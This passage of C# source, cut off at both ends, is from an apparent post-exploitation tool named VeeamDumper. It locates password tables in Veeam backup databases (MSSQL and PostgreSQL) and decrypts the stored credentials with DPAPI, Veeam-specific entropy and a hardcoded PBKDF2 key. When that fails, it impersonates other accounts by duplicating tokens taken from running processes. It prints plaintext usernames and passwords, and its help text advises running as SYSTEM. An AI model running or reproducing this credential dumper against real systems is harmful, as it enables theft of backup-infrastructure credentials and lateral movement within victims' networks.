                        WHERE (LOWER(c1.COLUMN_NAME) LIKE '%pass%' OR LOWER(c1.COLUMN_NAME) LIKE '%encrypt%' OR LOWER(c1.COLUMN_NAME) LIKE '%secret%')
                        AND (LOWER(c2.COLUMN_NAME) LIKE '%user%' OR LOWER(c2.COLUMN_NAME) = 'name')", conn))
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                            candidates.Add(new[] { reader.GetString(0), reader.GetString(1) });
                    }

                    foreach (var candidate in candidates)
                    {
                        string schema = candidate[0], table = candidate[1];
                        if (DEBUG)
                            Console.WriteLine($"[DEBUG] Found credential table candidate: [{schema}].[{table}]");

                        var columns = new List<string>();
                        using (var cmd = new SqlCommand(
                            "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = @schema AND TABLE_NAME = @table ORDER BY ORDINAL_POSITION", conn))
                        {
                            cmd.Parameters.AddWithValue("@schema", schema);
                            cmd.Parameters.AddWithValue("@table", table);
                            using (var reader = cmd.ExecuteReader())
                            {
                                while (reader.Read())
                                    columns.Add(reader.GetString(0));
                            }
                        }

                        var info = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
                        MapColumns(columns, info);
                        if (!info.ContainsKey("usernameCol") || !info.ContainsKey("passwordCol")) continue;

                        info.TryGetValue("descriptionCol", out var dc);
                        results.Add(new CredInfo
                        {
                            Schema = schema, Table = table,
                            UserCol = info["usernameCol"], PassCol = info["passwordCol"], DescCol = dc
                        });
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] Database discovery failed: {ex.Message}");
            }
            return results;
        }

        static List<CredInfo> DiscoverAllCredentialTablesPsql(string psqlExe, string database, string user)
        {
            string query = "SELECT DISTINCT c1.table_schema, c1.table_name FROM information_schema.columns c1 INNER JOIN information_schema.columns c2 ON c1.table_schema = c2.table_schema AND c1.table_name = c2.table_name WHERE c1.table_schema NOT IN ('pg_catalog','information_schema') AND (lower(c1.column_name) LIKE '%pass%' OR lower(c1.column_name) LIKE '%encrypt%' OR lower(c1.column_name) LIKE '%secret%') AND (lower(c2.column_name) LIKE '%user%' OR lower(c2.column_name) = 'name');";

            var psi = new ProcessStartInfo
            {
                FileName = psqlExe,
                Arguments = $"-d {database} -U {user} -A -F \" \" -t -c \"{query}\"",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            var results = new List<CredInfo>();
            try
            {
                using (var process = Process.Start(psi))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    if (process.ExitCode != 0 || string.IsNullOrWhiteSpace(output))
                        return results;

                    foreach (var rawLine in output.Split(new[] { "\r\n", "\n" }, StringSplitOptions.RemoveEmptyEntries))
                    {
                        var parts = rawLine.Trim().Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                        if (parts.Length < 2) continue;

                        string schema = parts[0], table = parts[1];
                        if (DEBUG)
                            Console.WriteLine($"[DEBUG] Found psql credential table candidate: {schema}.{table}");

                        string colQuery = $"SELECT column_name FROM information_schema.columns WHERE table_schema = '{schema}' AND table_name = '{table}' ORDER BY ordinal_position;";
                        var colPsi = new ProcessStartInfo
                        {
                            FileName = psqlExe,
                            Arguments = $"-d {database} -U {user} -A -t -c \"{colQuery}\"",
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };

                        using (var colProcess = Process.Start(colPsi))
                        {
                            string colOutput = colProcess.StandardOutput.ReadToEnd();
                            colProcess.WaitForExit();

                            if (colProcess.ExitCode == 0 && !string.IsNullOrWhiteSpace(colOutput))
                            {
                                var cols = colOutput.Split(new[] { "\r\n", "\n" }, StringSplitOptions.RemoveEmptyEntries)
                                    .Select(l => l.Trim()).Where(l => !string.IsNullOrEmpty(l)).ToList();
                                var info = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
                                MapColumns(cols, info);

                                if (info.ContainsKey("usernameCol") && info.ContainsKey("passwordCol"))
                                {
                                    info.TryGetValue("descriptionCol", out var dc);
                                    results.Add(new CredInfo
                                    {
                                        Schema = schema, Table = table,
                                        UserCol = info["usernameCol"], PassCol = info["passwordCol"], DescCol = dc
                                    });
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                if (DEBUG) Console.WriteLine($"[DEBUG] Psql credential discovery failed: {ex.Message}");
            }
            return results;
        }

        static void MapColumns(IEnumerable<string> columns, Dictionary<string, string> info)
        {
            string bestUserCol = null;
            foreach (var col in columns)
            {
                string colLower = col.ToLower();
                if (colLower.Contains("pass") || colLower.Contains("encrypt") || colLower.Contains("secret"))
                {
                    if (!info.ContainsKey("passwordCol")) info["passwordCol"] = col;
                }
                else if (colLower.Contains("desc") || colLower.Contains("comment") || colLower.Contains("remark") || colLower.Contains("note") || colLower.Contains("label"))
                {
                    if (!info.ContainsKey("descriptionCol")) info["descriptionCol"] = col;
                }
                else if (colLower.Contains("user"))
                    bestUserCol = bestUserCol ?? col;
                else if (colLower == "name" && bestUserCol == null)
                    bestUserCol = col;
            }
            if (bestUserCol != null) info["usernameCol"] = bestUserCol;

            if (DEBUG)
            {
                Console.WriteLine($"[DEBUG] All columns: {string.Join(", ", columns)}");
                string u = info.TryGetValue("usernameCol", out var du) ? du : "(none)";
                string p = info.TryGetValue("passwordCol", out var dp) ? dp : "(none)";
                string d = info.TryGetValue("descriptionCol", out var dd) ? dd : "(none)";
                Console.WriteLine($"[DEBUG] Mapped: user={u}, pass={p}, desc={d}");
            }
        }

        static Dictionary<string, string> DiscoverTable(string sqlcmdPath, string server, string database, string searchPattern)
        {
            string query = $"SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%{searchPattern}%' AND TABLE_NAME NOT LIKE '%Link%';";
            string result = RunSqlcmdSingleLine(sqlcmdPath, server, database, query);
            if (result == null) return null;

            var parts = result.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
            if (parts.Length < 2) return null;

            var info = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
            {
                ["schema"] = parts[0],
                ["table"] = parts[1]
            };

            if (DEBUG)
                Console.WriteLine($"[DEBUG] Found table: [{parts[0]}].[{parts[1]}]");

            query = $"SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '{parts[0]}' AND TABLE_NAME = '{parts[1]}' ORDER BY ORDINAL_POSITION;";
            var cols = RunSqlcmdLines(sqlcmdPath, server, database, query);
            if (cols != null) MapColumns(cols, info);

            return info;
        }

        static Dictionary<string, string> DiscoverTablePsql(string psqlPath, string database, string user, string searchPattern)
        {
            string query = $"SELECT table_schema, table_name FROM information_schema.tables WHERE table_name ILIKE '%{searchPattern}%' AND table_name NOT ILIKE '%link%' AND table_schema NOT IN ('pg_catalog','information_schema') LIMIT 1;";

            var psi = new ProcessStartInfo
            {
                FileName = psqlPath,
                Arguments = $"-d {database} -U {user} -A -F \" \" -t -c \"{query}\"",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            try
            {
                using (var process = Process.Start(psi))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    if (process.ExitCode != 0 || string.IsNullOrWhiteSpace(output)) return null;

                    var parts = output.Trim().Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                    if (parts.Length < 2) return null;

                    var info = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
                    {
                        ["schema"] = parts[0],
                        ["table"] = parts[1]
                    };

                    if (DEBUG)
                        Console.WriteLine($"[DEBUG] Found psql table: {parts[0]}.{parts[1]}");

                    query = $"SELECT column_name FROM information_schema.columns WHERE table_schema = '{parts[0]}' AND table_name = '{parts[1]}' ORDER BY ordinal_position;";
                    var colPsi = new ProcessStartInfo
                    {
                        FileName = psqlPath,
                        Arguments = $"-d {database} -U {user} -A -t -c \"{query}\"",
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };

                    using (var colProcess = Process.Start(colPsi))
                    {
                        string colOutput = colProcess.StandardOutput.ReadToEnd();
                        colProcess.WaitForExit();
                        if (colProcess.ExitCode == 0 && !string.IsNullOrWhiteSpace(colOutput))
                        {
                            var cols = colOutput.Split(new[] { "\r\n", "\n" }, StringSplitOptions.RemoveEmptyEntries)
                                .Select(l => l.Trim()).Where(l => !string.IsNullOrEmpty(l)).ToList();
                            MapColumns(cols, info);
                        }
                    }

                    return info;
                }
            }
            catch (Exception ex)
            {
                if (DEBUG) Console.WriteLine($"[DEBUG] Psql discovery failed: {ex.Message}");
            }
            return null;
        }

        // ======================== SQL Execution Helpers ========================

        static string RunSqlcmdSingleLine(string sqlcmdPath, string server, string database, string query)
        {
            var lines = RunSqlcmdLines(sqlcmdPath, server, database, query);
            return lines != null && lines.Count > 0 ? lines[0] : null;
        }

        static List<string> RunSqlcmdLines(string sqlcmdPath, string server, string database, string query)
        {
            var psi = new ProcessStartInfo
            {
                FileName = sqlcmdPath,
                Arguments = $"-S {server} -E -d {database} -Q \"{query}\" -h -1 -w 65535",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            try
            {
                using (var process = Process.Start(psi))
                {
                    var errorBuilder = new StringBuilder();
                    process.ErrorDataReceived += (s, e) => { if (e.Data != null) errorBuilder.AppendLine(e.Data); };
                    process.BeginErrorReadLine();
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();

                    if (DEBUG)
                        Console.WriteLine($"[DEBUG] Discovery output: {output.Trim()}");

                    if (!string.IsNullOrEmpty(errorBuilder.ToString()) || output.TrimStart().StartsWith("Msg "))
                        return null;

                    var lines = new List<string>();
                    using (var reader = new StringReader(output))
                    {
                        string line;
                        while ((line = reader.ReadLine()) != null)
                        {
                            line = line.Trim();
                            if (!string.IsNullOrWhiteSpace(line) && !line.StartsWith("("))
                                lines.Add(line);
                        }
                    }
                    return lines.Count > 0 ? lines : null;
                }
            }
            catch (Exception ex)
            {
                if (DEBUG) Console.WriteLine($"[DEBUG] Discovery failed: {ex.Message}");
            }
            return null;
        }

        // ======================== Output Processing ========================

        static void RunAndProcess(ProcessStartInfo psi, bool readOnly, bool veeamOne)
        {
            using (var process = Process.Start(psi))
            {
                var errorBuilder = new StringBuilder();
                process.ErrorDataReceived += (s, e) => { if (e.Data != null) errorBuilder.AppendLine(e.Data); };
                process.BeginErrorReadLine();
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
                string error = errorBuilder.ToString();

                if (DEBUG)
                {
                    Console.WriteLine("[DEBUG] Standard Output:\n" + output);
                    Console.WriteLine("[DEBUG] Standard Error:\n" + error);
                }

                if (!string.IsNullOrEmpty(error))
                {
                    Console.WriteLine($"[ERROR] SQL: {error}");
                    return;
                }
                if (output.TrimStart().StartsWith("Msg ") || output.Contains("Invalid object name"))
                {
                    Console.WriteLine($"[ERROR] SQL: {output.Trim()}");
                    return;
                }

                if (output.Contains("(0 rows affected)"))
                {
                    if (DEBUG) Console.WriteLine("[DEBUG] Table is empty, skipping");
                    return;
                }
                else
                {
                    Console.WriteLine("=====================================");
                    Console.WriteLine(readOnly ? "|           LISTING USERS           |" : "|        JUICY CREDS LOADING        |");
                    Console.WriteLine("=====================================");
                }

                using (var reader = new StringReader(output))
                {
                    string line;
                    while ((line = reader.ReadLine()) != null)
                    {
                        if (DEBUG) Console.WriteLine("[DEBUG] Processing: " + line);
                        if (string.IsNullOrWhiteSpace(line) || !line.Contains(":")) continue;

                        if (readOnly)
                        {
                            var parts = line.Split(new[] { ':' }, 2);
                            if (parts.Length < 2) continue;
                            Console.WriteLine($"Username   : {parts[0].Trim()}");
                            Console.WriteLine($"Description: {parts[1].Trim()}");
                            Console.WriteLine("---------------------------------------------");
                        }
                        else
                        {
                            var parts = line.Split(new[] { ':' }, 3);
                            if (parts.Length < 3) continue;

                            string username = parts[0].Trim();
                            string encrypted = parts[1].Trim();
                            string description = parts[2].Trim();

                            try
                            {
                                if (string.IsNullOrWhiteSpace(encrypted) || encrypted == "NULL") continue;

                                string password;
                                if (veeamOne) password = DecryptOne(encrypted);
                                else if (encrypted.StartsWith("A")) password = DecryptA(encrypted);
                                else if (encrypted.StartsWith("V")) password = DecryptV(encrypted);
                                else continue;

                                Console.WriteLine($"Username   : {username}");
                                Console.WriteLine($"Password   : {password}");
                                Console.WriteLine($"Description: {description}");
                                Console.WriteLine("---------------------------------------------");
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine(ex.ToString());
                                Console.WriteLine($"[ERROR] Failed to decrypt {username}");
                            }
                        }
                    }
                }
            }
        }

        static List<string[]> ExecuteMapQuery(ProcessStartInfo psi)
        {
            Console.WriteLine($"[INFO] Running command: {psi.FileName} {psi.Arguments}");

            using (var process = Process.Start(psi))
            {
                var errorBuilder = new StringBuilder();
                process.ErrorDataReceived += (s, e) => { if (e.Data != null) errorBuilder.AppendLine(e.Data); };
                process.BeginErrorReadLine();
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
                string error = errorBuilder.ToString();

                if (DEBUG)
                {
                    Console.WriteLine("[DEBUG] SQL Output:\n" + output);
                    Console.WriteLine("[DEBUG] SQL Error:\n" + error);
                }

                if (!string.IsNullOrWhiteSpace(error))
                {
                    Console.WriteLine($"[ERROR] SQL: {error}");
                    return new List<string[]>();
                }
                if (output.TrimStart().StartsWith("Msg ") || output.Contains("Invalid object name"))
                {
                    Console.WriteLine($"[ERROR] SQL: {output.Trim()}");
                    return new List<string[]>();
                }
                if (string.IsNullOrWhiteSpace(output) || output.Contains("(0 rows affected)"))
                {
                    Console.WriteLine("[INFO] No rows returned.");
                    return new List<string[]>();
                }

                return output.Split(new[] { "\r\n", "\n" }, StringSplitOptions.RemoveEmptyEntries)
                    .Select(l => l.Split(':').Select(c => c.Trim()).ToArray())
                    .Where(c => c.Length >= 2)
                    .ToList();
            }
        }

        static void PrintCredentialHostTable(List<string[]> mapping)
        {
            if (mapping == null || mapping.Count == 0)
            {
                Console.WriteLine("[INFO] No credential mappings found.");
                return;
            }

            int usernameWidth = Math.Max("Username".Length, mapping.Max(x => x[0].Trim().Length)) + 4;

            Console.WriteLine();
            Console.WriteLine(new string('=', usernameWidth + 30));
            Console.WriteLine("Username".PadRight(usernameWidth) + "Hosts");
            Console.WriteLine(new string('=', usernameWidth + 30));

            foreach (var row in mapping.OrderBy(x => x[0]))
            {
                string username = row[0].Trim();
                var hosts = row[1].Split(',').Select(h => h.Trim())
                    .Where(h => !string.IsNullOrWhiteSpace(h))
                    .Distinct(StringComparer.OrdinalIgnoreCase).OrderBy(h => h).ToList();

                Console.WriteLine(username.PadRight(usernameWidth) + $"> {hosts.FirstOrDefault()}");
                foreach (var host in hosts.Skip(1))
                    Console.WriteLine(new string(' ', usernameWidth) + $"> {host}");
                Console.WriteLine(new string('-', usernameWidth + 30));
            }
        }

        // ======================== Decryption ========================

        // ======================== Token Impersonation ========================

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(IntPtr process, uint access, out IntPtr token);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool DuplicateTokenEx(IntPtr existing, uint access, IntPtr attrs, int impLevel, int tokenType, out IntPtr duplicate);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr handle);

        [DllImport("userenv.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool LoadUserProfile(IntPtr hToken, ref PROFILEINFO lpProfileInfo);

        [DllImport("userenv.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool UnloadUserProfile(IntPtr hToken, IntPtr hProfile);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        struct PROFILEINFO
        {
            public int dwSize;
            public int dwFlags;
            public string lpUserName;
            public string lpProfilePath;
            public string lpDefaultPath;
            public string lpServerName;
            public string lpPolicyPath;
            public IntPtr hProfile;
        }

        static Guid ExtractMasterKeyGuid(byte[] dpapiBlob)
        {
            if (dpapiBlob.Length < 40) return Guid.Empty;
            byte[] guidBytes = new byte[16];
            Array.Copy(dpapiBlob, 24, guidBytes, 0, 16);
            return new Guid(guidBytes);
        }

        static string FindMasterKeyOwnerSid(Guid mkGuid)
        {
            string guidStr = mkGuid.ToString();

            string systemPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.Windows),
                @"System32\Microsoft\Protect\S-1-5-18");
            if (Directory.Exists(systemPath) && File.Exists(Path.Combine(systemPath, guidStr)))
                return "S-1-5-18";

            string usersDir = Path.GetDirectoryName(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
            try
            {
                foreach (var userDir in Directory.GetDirectories(usersDir))
                {
                    string protectPath = Path.Combine(userDir, @"AppData\Roaming\Microsoft\Protect");
                    if (!Directory.Exists(protectPath)) continue;

                    foreach (var sidDir in Directory.GetDirectories(protectPath))
                    {
                        if (File.Exists(Path.Combine(sidDir, guidStr)))
                            return Path.GetFileName(sidDir);
                    }
                }
            }
            catch { }
            return null;
        }

        static WindowsImpersonationContext ImpersonateBySid(string targetSid, out IntPtr primaryToken)
        {
            primaryToken = IntPtr.Zero;
            foreach (var proc in Process.GetProcesses())
            {
                try
                {
                    IntPtr hProcess = OpenProcess(0x0400, false, proc.Id);
                    if (hProcess == IntPtr.Zero) continue;

                    IntPtr hToken;
                    if (!OpenProcessToken(hProcess, 0x000A, out hToken))
                    {
                        CloseHandle(hProcess); continue;
                    }

                    try
                    {
                        var identity = new WindowsIdentity(hToken);
                        if (identity.User != null && identity.User.Value == targetSid)
                        {
                            IntPtr hPrimary, hImpersonation;
                            if (!DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hPrimary))
                                continue;
                            if (!DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 2, out hImpersonation))
                            {
                                CloseHandle(hPrimary);
                                continue;
                            }

                            var newIdentity = new WindowsIdentity(hImpersonation);
                            if (DEBUG)
                                Console.WriteLine($"[DEBUG] Impersonating master key owner: {newIdentity.Name} ({targetSid}) from process {proc.ProcessName}");
                            primaryToken = hPrimary;
                            return newIdentity.Impersonate();
                        }
                    }
                    finally { CloseHandle(hToken); CloseHandle(hProcess); }
                }
                catch { }
                finally { proc.Dispose(); }
            }
            return null;
        }


        // ======================== Decryption ========================

        static string TryDecrypt(string encrypted, bool isVeeamOne)
        {
            if (string.IsNullOrWhiteSpace(encrypted) || encrypted == "NULL") return null;

            if (isVeeamOne && VeeamEntropy != null)
            {
                try { var r = DecryptOne(encrypted); if (DEBUG) Console.WriteLine("[DEBUG] DecryptOne succeeded"); return r; }
                catch (Exception ex) { if (DEBUG) Console.WriteLine($"[DEBUG] DecryptOne failed: {ex.Message}"); }
            }

            if (isVeeamOne)
            {
                try { var r = DecryptOneStatic(encrypted); if (DEBUG) Console.WriteLine("[DEBUG] DecryptOneStatic succeeded"); return r; }
                catch (Exception ex) { if (DEBUG) Console.WriteLine($"[DEBUG] DecryptOneStatic failed: {ex.Message}"); }
            }

            if (encrypted.StartsWith("A"))
            {
                try { var r = DecryptA(encrypted); if (DEBUG) Console.WriteLine("[DEBUG] DecryptA succeeded"); return r; }
                catch (Exception ex) { if (DEBUG) Console.WriteLine($"[DEBUG] DecryptA failed: {ex.Message}"); }
            }

            if (encrypted.StartsWith("V") && VeeamSalt != null)
            {
                try { var r = DecryptV(encrypted); if (DEBUG) Console.WriteLine("[DEBUG] DecryptV succeeded"); return r; }
                catch (Exception ex) { if (DEBUG) Console.WriteLine($"[DEBUG] DecryptV failed: {ex.Message}"); }
            }

            if (isVeeamOne)
            {
                try { var r = DecryptOnePbkdf2(encrypted); if (DEBUG) Console.WriteLine("[DEBUG] DecryptOnePbkdf2 succeeded (pre-v11)"); return r; }
                catch (Exception ex) { if (DEBUG) Console.WriteLine($"[DEBUG] DecryptOnePbkdf2 failed: {ex.Message}"); }
            }

            try
            {
                var data = Convert.FromBase64String(encrypted);

                var scopes = new[] {
                    DataProtectionScope.LocalMachine,
                    DataProtectionScope.CurrentUser
                };
                var encodings = new[] { Encoding.Unicode, Encoding.UTF8 };
                var entropies = new List<byte[]> { null };
                if (VeeamEntropy != null) entropies.Insert(0, VeeamEntropy);
                entropies.Add(VeeamOneStaticEntropy);
                if (VeeamSalt != null) entropies.Add(VeeamSalt);

                foreach (var scope in scopes)
                {
                    foreach (var entropy in entropies)
                    {
                        foreach (var encoding in encodings)
                        {
                            try
                            {
                                var raw = ProtectedData.Unprotect(data, entropy, scope);
                                var result = encoding.GetString(raw);
                                if (DEBUG)
                                {
                                    string eName = EntropyLabel(entropy);
                                    Console.WriteLine($"[DEBUG] DPAPI succeeded: scope={scope}, entropy={eName}, encoding={encoding.EncodingName}");
                                }
                                return result;
                            }
                            catch { }
                        }
                    }
                }

                if (DEBUG) Console.WriteLine("[DEBUG] All DPAPI combinations failed as current user");

                var mkGuid = ExtractMasterKeyGuid(data);
                if (mkGuid != Guid.Empty)
                {
                    if (DEBUG) Console.WriteLine($"[DEBUG] DPAPI master key GUID: {mkGuid}");

                    string ownerSid = FindMasterKeyOwnerSid(mkGuid);
                    if (ownerSid != null)
                    {
                        if (DEBUG) Console.WriteLine($"[DEBUG] Master key owner SID: {ownerSid}");

                        IntPtr hPrimaryToken;
                        var impCtx = ImpersonateBySid(ownerSid, out hPrimaryToken);
                        if (impCtx != null)
                        {
                            IntPtr hProfile = IntPtr.Zero;
                            try
                            {
                                hProfile = TryLoadUserProfile(hPrimaryToken, ownerSid);

                                foreach (var scope in scopes)
                                {
                                    foreach (var entropy in entropies)
                                    {
                                        foreach (var encoding in encodings)
                                        {
                                            try
                                            {
                                                var raw = ProtectedData.Unprotect(data, entropy, scope);
                                                var result = encoding.GetString(raw);
                                                if (DEBUG)
                                                {
                                                    string eName = EntropyLabel(entropy);
                                                    Console.WriteLine($"[DEBUG] DPAPI as SID {ownerSid} succeeded: scope={scope}, entropy={eName}, encoding={encoding.EncodingName}");
                                                }
                                                return result;
                                            }
                                            catch { }
                                        }
                                    }
                                }
                                if (DEBUG) Console.WriteLine($"[DEBUG] All DPAPI combinations failed as {ownerSid}");
                            }
                            finally
                            {
                                impCtx.Undo();
                                if (hProfile != IntPtr.Zero)
                                    UnloadUserProfile(hPrimaryToken, hProfile);
                                if (hPrimaryToken != IntPtr.Zero)
                                    CloseHandle(hPrimaryToken);
                            }
                        }
                        else
                        {
                            Console.WriteLine($"[WARN] Master key belongs to SID {ownerSid} but no running process found for that account");
                            Console.WriteLine("[WARN] Try running the tool as SYSTEM (PsExec -s) or as the Veeam ONE service account");
                        }
                    }
                    else if (DEBUG)
                        Console.WriteLine($"[DEBUG] Could not find master key {mkGuid} in any Protect folder");
                }
                else if (DEBUG)
                    Console.WriteLine("[DEBUG] Could not extract master key GUID from blob");
            }
            catch (Exception ex) { if (DEBUG) Console.WriteLine($"[DEBUG] Base64 decode failed: {ex.Message}"); }

            return null;
        }

        static string EntropyLabel(byte[] entropy)
        {
            if (entropy == null) return "none";
            if (entropy == VeeamEntropy) return "VeeamEntropy";
            if (entropy == VeeamOneStaticEntropy) return "StaticGUID";
            if (entropy == VeeamSalt) return "VeeamSalt";
            return $"unknown({entropy.Length}B)";
        }

        static IntPtr TryLoadUserProfile(IntPtr hToken, string sid)
        {
            try
            {
                string userName = null;
                try
                {
                    var identity = new WindowsIdentity(hToken);
                    userName = identity.Name;
                    if (userName.Contains("\\"))
                        userName = userName.Split('\\')[1];
                }
                catch { userName = sid; }

                var pi = new PROFILEINFO();
                pi.dwSize = Marshal.SizeOf(pi);
                pi.lpUserName = userName;

                if (LoadUserProfile(hToken, ref pi) && pi.hProfile != IntPtr.Zero)
                {
                    if (DEBUG) Console.WriteLine($"[DEBUG] LoadUserProfile succeeded for {userName}");
                    return pi.hProfile;
                }
                else
                {
                    if (DEBUG) Console.WriteLine($"[DEBUG] LoadUserProfile failed (error {Marshal.GetLastWin32Error()}), continuing with impersonation only");
                }
            }
            catch (Exception ex)
            {
                if (DEBUG) Console.WriteLine($"[DEBUG] LoadUserProfile exception: {ex.Message}");
            }
            return IntPtr.Zero;
        }

        static string DecryptA(string encrypted)
        {
            var data = Convert.FromBase64String(encrypted);
            return Encoding.UTF8.GetString(
                ProtectedData.Unprotect(data, null, DataProtectionScope.LocalMachine));
        }

        static string DecryptV(string encrypted)
        {
            if (VeeamSalt == null)
                throw new Exception("EncryptionSalt not initialised.");

            var hex = BitConverter.ToString(Convert.FromBase64String(encrypted)).Replace("-", "").ToLower();
            if (hex.Length <= 74) throw new Exception("Invalid V-format blob");
            hex = hex.Substring(74);

            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < hex.Length; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);

            return Encoding.UTF8.GetString(
                ProtectedData.Unprotect(bytes, VeeamSalt, DataProtectionScope.LocalMachine));
        }

        static string DecryptOne(string encrypted)
        {
            if (string.IsNullOrEmpty(encrypted) || VeeamEntropy == null || VeeamEntropy.Length == 0)
                throw new Exception("Entropy not initialised.");

            return Encoding.Unicode.GetString(
                ProtectedData.Unprotect(
                    Convert.FromBase64String(encrypted), VeeamEntropy,
                    DataProtectionScope.LocalMachine));
        }

        static string DecryptOneStatic(string encrypted)
        {
            var data = Convert.FromBase64String(encrypted);
            var raw = ProtectedData.Unprotect(data, VeeamOneStaticEntropy, DataProtectionScope.LocalMachine);
            var result = Encoding.Unicode.GetString(raw);
            if (string.IsNullOrEmpty(result))
                throw new Exception("Decrypted to empty string");
            return result;
        }

        static string DecryptOnePbkdf2(string encrypted)
        {
            var data = Convert.FromBase64String(encrypted);
            if (data.Length < 33)
                throw new Exception("Blob too short for PBKDF2+AES format");
            if (data.Length >= 4 && data[0] == 0x01 && data[1] == 0x00 && data[2] == 0x00 && data[3] == 0x00)
                throw new Exception("Blob is DPAPI, not PBKDF2");

            byte[] salt = new byte[16];
            byte[] iv = new byte[16];
            byte[] ciphertext = new byte[data.Length - 32];
            Array.Copy(data, 0, salt, 0, 16);
            Array.Copy(data, 16, iv, 0, 16);
            Array.Copy(data, 32, ciphertext, 0, ciphertext.Length);

            using (var pbkdf2 = new Rfc2898DeriveBytes("123456789", salt, 1000))
            {
                byte[] key = pbkdf2.GetBytes(16);
                using (var aes = Aes.Create())
                {
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    aes.Key = key;
                    aes.IV = iv;
                    using (var decryptor = aes.CreateDecryptor())
                    {
                        var plain = decryptor.TransformFinalBlock(ciphertext, 0, ciphertext.Length);
                        var result = Encoding.UTF8.GetString(plain);
                        if (string.IsNullOrEmpty(result))
                            throw new Exception("Decrypted to empty string");
                        return result;
                    }
                }
            }
        }

        // ======================== Help ========================

        static void PrintHelp()
        {
            Console.WriteLine("==================================================================");
            Console.WriteLine("|                                                                |");
            Console.WriteLine("|                        *(((((((((((((.                         |");
            Console.WriteLine("|                   (((((((((((((((((((((((((                    |");
            Console.WriteLine("|                (((((((((((((((((/(((((((((((((                 |");
            Console.WriteLine("|             ((((((((((((((((,(((((((((((((((((((               |");
            Console.WriteLine("|           *((((((((((((( *((((((((((((((((((((((               |");
            Console.WriteLine("|          ((((((((((((  ((((((((((((((((((((((((    ..          |");
            Console.WriteLine("|         (((((((((((  ((((               ((((       &&          |");
            Console.WriteLine("|        *((((((((*  ,                              &&&,         |");
            Console.WriteLine("|        ((((((((            /&&&&&&&&&,           &&&&&         |");
            Console.WriteLine("|        ((((((            &&&&&&&&&&&           .&&&&&&         |");
            Console.WriteLine("|        (((((           ,&&&&&&&&&.            &&&&&&&&         |");
            Console.WriteLine("|        *(((                             *   &&&&&&&&&,         |");
            Console.WriteLine("|         ((      .&&&&               %&&&  &&&&&&&&&&%          |");
            Console.WriteLine("|          .    &&&&&&&&&&&&&&&&&&&&&&&% ,&&&&&&&&&&&%           |");
            Console.WriteLine("|              &&&&&&&&&&&&&&&&&&&&&&..&&&&&&&&&&&&&.            |");
            Console.WriteLine("|              &&&&&&&&&&&&&&&&&&& &&&&&&&&&&&&&&&/              |");
            Console.WriteLine("|                &&&&&&&&&&&&%%&&&&&&&&&&&&&&&&&                 |");
            Console.WriteLine("|                   %&&&&&&&&&&&&&&&&&&&&&&&%                    |");
            Console.WriteLine("|                         &&&&&&&&&&&&&                          |");
            Console.WriteLine("|                                                                |");
            Console.WriteLine("==================================================================");
            Console.WriteLine("|                    V E E A M   D U M P E R                     |");
            Console.WriteLine("==================================================================");
            Console.WriteLine("Usage: VeeamDumper.exe <action> [options]");
            Console.WriteLine();
            Console.WriteLine("Actions:");
            Console.WriteLine("  enum         Enumerate Veeam configuration");
            Console.WriteLine("  auto         Automatically enumerate the configuration and extract credentials");
            Console.WriteLine("  mssql        Extract Veeam credentials from MSSQL database");
            Console.WriteLine("  psql         Extract Veeam credentials from PostgreSQL database");
            Console.WriteLine("  map          Map credentials to specific targets [Experimental]");
            Console.WriteLine();
            Console.WriteLine("Options:");
            Console.WriteLine("  -s <server>      Override SQL Server instance (value passed to sqlcmd -S)");
            Console.WriteLine("  -v <dbName>      Override Veeam database name (default: VeeamBackup)");
            Console.WriteLine("  -m <sqlcmdPath>  Override path to sqlcmd.exe");
            Console.WriteLine("  -p <psqlPath>    Override path to psql.exe");
            Console.WriteLine("  -l               Enumerate usernames of credentials stored in the database");
